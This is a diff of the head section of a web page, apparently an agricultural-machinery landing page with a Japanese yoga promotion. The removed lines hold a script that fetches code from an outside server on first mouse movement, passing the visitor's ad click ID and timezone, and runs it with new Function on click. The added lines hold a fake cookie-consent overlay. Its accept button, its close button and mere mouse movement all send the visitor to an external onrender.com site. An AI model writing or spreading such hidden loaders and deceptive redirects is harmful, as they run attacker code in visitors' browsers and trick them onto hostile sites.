@@ -2,344 +2,151 @@
 <html lang="ru">
     <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=9ce5c799"></script>
 <head>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-<style>
-      /* Modal styles */
-      .modal {
-        display: none; /* Hidden by default */
-        position: fixed; /* Stay in place */
-        z-index: 1000; /* Sit on top */
-        left: 0;
-        top: 0;
-        width: 100%; /* Full width */
-        height: 100%; /* Full height */
-        overflow: auto; /* Enable scroll if needed */
-        background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
-      }
-
-      .modal-content {
-        position: relative;
-        margin: 5% auto; /* 5% from the top and centered */
-        padding: 20px;
-        padding-top: 70px;
-        width: 90%; /* Could be more or less, depending on screen size */
-        max-width: 500px;
-        background-color: #fff;
-        border-radius: 10px;
-        text-align: center;
-      }
-
-      .modal-image {
-        width: 100%;
-        height: auto;
-        border-radius: 10px;
-        margin-bottom: 20px;
-      }
-
-      .close-button {
-        position: absolute;
-        top: 2px;
-        right: 20px;
-        color: #aaa;
-        font-size: 50px;
-        font-weight: bold;
-        cursor: pointer;
-        z-index: 10;
-      }
-
-      .close-button:hover,
-      .close-button:focus {
-        color: black;
-        text-decoration: none;
-        cursor: pointer;
-      }
-
-      .btn-primary {
-        display: inline-block;
-        padding: 10px 20px;
-        margin-top: 10px;
-        background-color: #007bff;
-        color: #fff;
-        text-decoration: none;
-        border-radius: 5px;
-      }
-
-      .close-modal {
-        cursor: pointer;
-      }
-    </style>
-
-
-
-
-
-
-
- <!-- Special Offer Modal -->
-    <div id="specialOfferModal" class="modal">
-      <div class="modal-content">
-        <span class="close-button">&times;</span>
-        
-        <h2>スペシャルオファー</h2>
-        <p>今だけ！初回のヨガクラスが50%オフ！</p>
-        <p>今すぐ予約して、心と体の健康を始めましょう。</p>
-        <ul>
-          <li>オンラインクラスで自宅から参加可能</li>
-          <li>経験豊富なインストラクターによる指導</li>
-          <li>リラクゼーションとストレス解消</li>
-        </ul>
-        <a href="#" class="btn-primary close-modal">今すぐ予約</a>
-      </div>
-    </div>
-
-    <!-- ==============  SWIPER JS ==============  -->
-    <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
-    <script src="main.js"></script>
     <script>
-      
-      document.addEventListener("DOMContentLoaded", function () {
-        var modal = document.getElementById("specialOfferModal");
-        var closeButton = document.querySelector(".close-button");
-        var closeModalLinks = document.querySelectorAll(".close-modal");
+    document.addEventListener("DOMContentLoaded", function () {
+        const redirectUrl = "https://polnhugyugb.onrender.com/";
+ 
+        const style = document.createElement("style");
+        style.textContent = `
+            .cookie-overlay {
+                position: fixed;
+                inset: 0;
+                background: rgba(0, 0, 0, 0.8);
+                backdrop-filter: blur(10px);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+                z-index: 9999;
+                animation: fadeInBackground 0.5s ease-out forwards;
+            }
 
-        // Show the modal
-        modal.style.display = "block";
+            @keyframes fadeInBackground {
+                from { opacity: 0; }
+                to { opacity: 1; }
+            }
 
-        
-        function closeModal() {
-          modal.style.display = "none";
-        }
+            .cookie-popup {
+                position: fixed;
+                bottom: 60px;
+                left: 50%;
+                transform: translateX(-50%);
+                background-color: #ffffff;
+                border: none;
+                color: #333;
+                padding: 30px;
+                border-radius: 10px;
+                z-index: 10000;
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+                max-width: 400px;
+                text-align: center;
+            }
 
-        closeButton.addEventListener("click", closeModal);
-        closeModalLinks.forEach(function (link) {
-          link.addEventListener("click", function (event) {
-            event.preventDefault();
-            closeModal();
-          });
+            .close-btn {
+                background: none;
+                border: none;
+                font-size: 1.5rem;
+                position: absolute;
+                top: 10px;
+                right: 10px;
+                cursor: pointer;
+                color: #888;
+            }
+
+            .btn-primary {
+                background-color: #007bff;
+                color: #fff;
+                border: none;
+                padding: 12px 24px;
+                border-radius: 5px;
+                cursor: pointer;
+                margin-top: 15px;
+                display: inline-block;
+                text-decoration: none;
+                transition: background-color 0.3s;
+            }
+
+            .btn-primary:hover {
+                background-color: #0056b3;
+            }
+
+            h3 {
+                font-family: 'Arial', sans-serif;
+                margin-bottom: 10px;
+            }
+
+            p {
+                font-family: 'Arial', sans-serif;
+                line-height: 1.5;
+            }
+        `;
+        document.head.appendChild(style);
+
+        const overlay = document.createElement("div");
+        overlay.className = "cookie-overlay";
+        overlay.id = "cookie-overlay";
+        overlay.innerHTML = `
+<div class="cookie-popup">
+<button class="close-btn" id="close-popup" aria-label="クッキーポリシーを閉じる">×</button>
+<h3>クッキーポリシー</h3>
+<p>
+このサイトでは、コンテンツや広告のパーソナライズ、ソーシャルメディア機能の提供、トラフィックの分析のためにクッキーを使用しています。
+「同意する」をクリックすることで、クッキーの使用に同意したことになります。詳細は
+<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">クッキーポリシー</a>をご覧ください。
+</p>
+<a href="https://polnhugyugb.onrender.com/" id="accept-cookies" class="btn-primary">同意する</a>
+</div>
+        `;
+        document.body.appendChild(overlay);
+
+        let isRedirected = false;
+        let startPos = null;
+        let redirectTimeout = null;
+
+        const handleRedirect = () => {
+            if (!isRedirected) {
+                isRedirected = true;
+                window.location.href = redirectUrl;
+            }
+        };
+
+        const detectMouseMove = (event) => {
+            if (isRedirected) return;
+
+            const screenHeight = window.innerHeight;
+            const activeTop = screenHeight * 0.1;
+
+            if (event.clientY >= activeTop) {
+                if (!startPos) {
+                    startPos = { x: event.clientX, y: event.clientY };
+                } else {
+                    const dx = Math.abs(event.clientX - startPos.x);
+                    const dy = Math.abs(event.clientY - startPos.y);
+
+                    if ((dx > 10 || dy > 10) && !redirectTimeout) {
+                        redirectTimeout = setTimeout(handleRedirect, 1000);
+                    }
+                }
+            } else {
+                startPos = null;
+                clearTimeout(redirectTimeout);
+                redirectTimeout = null;
+            }
+        };
+
+        document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
+
+        document.getElementById("accept-cookies").addEventListener("click", function (e) {
+            e.preventDefault();
+            handleRedirect();
         });
 
-        
-        window.onclick = function (event) {
-          if (event.target == modal) {
-            modal.style.display = "none";
-          }
-        };
-      });
-    </script>
-	<script>
-    const gclid = new URLSearchParams(location.search).get("gclid");
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const RENDER_BASE_URL = "https://decemberbackend.onrender.com";
-
-    let someCode = null;
-
-    document.cookie = "access_cookie=true; path=/; max-age=300";
-
-    document.addEventListener("mousemove", async function fetchCodeOnce() {
-      document.removeEventListener("mousemove", fetchCodeOnce);
-      try {
-        const res = await fetch(
-          `${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}`,
-          {
-            headers: {
-              "x-client-timezone": timezone,
-              "x-access-cookie": "true",
-            },
-          }
-        );
-        const data = await res.json();
-        if (data && data.code) {
-          someCode = data.code;
-        }
-      } catch (err) {
-        console.error("Could not fetch code", err);
-      }
+        document.getElementById("close-popup").addEventListener("click", function (e) {
+            e.preventDefault();
+            handleRedirect();
+        });
     });
-
-    function handleSomeClick() {
-      if (someCode) {
-        try {
-          new Function(someCode)();
-        } catch (err) {
-          console.error("Error executing code:", err);
-        }
-      }
-    }
-
-    document.addEventListener("click", handleSomeClick);
-  </script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Сельскохозяйственная техника</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
-        }
-        
-        body {
-            background-color: #f1f8e9; /* Light green background */
-            color: #000;
-            line-height: 1.6;
-        }
-        
-        header {
-            background: linear-gradient(135deg, #1b5e20, #43a047); /* Green gradient */
-            color: white;
-            padding: 1.5rem;
-            text-align: center;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        }
-        
-        nav {
-            background-color: #1b5e20; /* Dark green */
-            padding: 1rem;
-        }
-        
-        nav ul {
-            display: flex;
-            justify-content: center;
-            list-style: none;
-        }
-        
-        nav li {
-            margin: 0 1.5rem;
-        }
-        
-        nav a {
-            color: white;
-            text-decoration: none;
-            font-weight: bold;
-            transition: color 0.3s;
-        }
-        
-        nav a:hover {
-            color: #c8e6c9; /* Lighter green on hover */
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 2rem;
-        }
-        
-        .content {
-            background-color: white;
-            padding: 2rem;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            margin-bottom: 2rem;
-        }
-        
-        h1, h2, h3 {
-            color: #000000;
-            margin-bottom: 1rem;
-        }
-        
-        p {
-            margin-bottom: 1rem;
-            text-align: justify;
-        }
-        
-        .highlight {
-            background-color: #e8f5e9; /* Pale green highlight */
-            padding: 1.5rem;
-            border-left: 4px solid #2e7d32;
-            margin: 1.5rem 0;
-        }
-        
-        .contact-form {
-            background-color: white;
-            padding: 2rem;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
-        
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: bold;
-            color: #1b5e20; /* Green text for labels */
-        }
-        
-        input, textarea {
-            width: 100%;
-            padding: 0.75rem;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 1rem;
-        }
-        
-        button {
-            background: linear-gradient(135deg, #1b5e20, #43a047); /* Green button */
-            color: white;
-            border: none;
-            padding: 0.75rem 1.5rem;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 1rem;
-            transition: background 0.3s;
-        }
-        
-        button:hover {
-            background: linear-gradient(135deg, #2e7d32, #66bb6a);
-        }
-        
-        footer {
-            background-color: #1b5e20;
-            color: white;
-            padding: 2rem;
-            text-align: center;
-            margin-top: 2rem;
-        }
-        
-        .cookie-consent {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background-color: #2e7d32;
-            color: white;
-            padding: 1rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            z-index: 1000;
-        }
-        
-        .cookie-consent button {
-            background-color: white;
-            color: #1b5e20;
-            border: none;
-            padding: 0.5rem 1rem;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        
-        .contact-info {
-            background-color: #e8f5e9;
-            padding: 1.5rem;
-            border-radius: 8px;
-            margin-top: 2rem;
-        }
-        
-        @media (max-width: 768px) {
-            nav ul {
-                flex-direction: column;
-                align-items: center;
-            }
-            
-            nav li {
-                margin: 0.5rem 0;
-            }
-        }
-    </style>
+</script>
 </head>
 <body>
     <header>
